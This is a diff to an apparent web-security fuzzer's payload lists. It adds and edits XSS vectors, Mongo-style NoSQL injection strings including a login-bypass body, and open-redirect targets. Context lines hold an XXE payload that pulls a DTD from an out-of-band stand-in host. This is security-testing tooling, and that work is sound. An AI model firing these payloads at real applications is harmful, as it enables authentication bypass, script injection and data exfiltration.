@@ -57,7 +57,11 @@ XSS = [
     "<x onmouseover=alert(1)>",
     "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
     "<details/open/ontoggle=alert(1)>",
-    "<style>@import'//lacuna-evil.example/x.css'</style>",
+    # CSS @import is a stylesheet load, not an XSS sink — the only way it
+    # delivers JS is via a follow-on script-src injection. The previous
+    # payload landed in the XSS list by mistake and never fired. We
+    # replace it with an SVG-XSS variant that hasn't appeared above.
+    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
 ]
 
 # C. OS command injection
@@ -149,15 +153,24 @@ XXE = [
     "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB_TOKEN.oob.local/x.dtd\">%p;]><r>x</r>",
 ]
 
-# H. NoSQL injection (Mongo-style)
+# H. NoSQL injection (Mongo-style).
+# Note: when these payloads land in a JSON request body the param expects a
+# raw JSON value, not a string. ``fuzz_param`` will JSON-encode the payload
+# when ``param_in == "json"`` (we don't double-encode here). The
+# query-string variants below already use URL-encoded brackets so they're
+# safe to drop into ``param_in == "query"`` unchanged.
 NOSQL = [
-    "{\"$ne\": null}",
-    "{\"$gt\": \"\"}",
-    "{\"$regex\": \".*\"}",
-    "true, $where: '1==1'",
+    '{"$ne": null}',
+    '{"$gt": ""}',
+    '{"$regex": ".*"}',
+    '{"$where": "1==1"}',
     "[$ne]=1",
+    "%5B%24ne%5D=1",
+    "%5B%24gt%5D=",
+    "%5B%24regex%5D=.%2A",
     "';return true;//",
     "1';return true;//",
+    '{"username": {"$ne": null}, "password": {"$ne": null}}',
 ]
 
 # I. Log4j / JNDI
@@ -179,13 +192,13 @@ CSV_INJECTION = [
     "-1+1",
 ]
 
-# K. Open redirect
+# K. Open redirect — use RFC 2606 ``.invalid`` so DNS never resolves these.
 OPEN_REDIRECT = [
-    "https://lacuna-evil.example/",
-    "//lacuna-evil.example/",
-    "/\\lacuna-evil.example/",
-    "https://lacuna-evil.example#@trusted.example/",
-    "https:lacuna-evil.example",
+    "https://lacuna-evil.invalid/",
+    "//lacuna-evil.invalid/",
+    "/\\lacuna-evil.invalid/",
+    "https://lacuna-evil.invalid#@trusted.invalid/",
+    "https:lacuna-evil.invalid",
     "javascript:alert(1)",
 ]
 
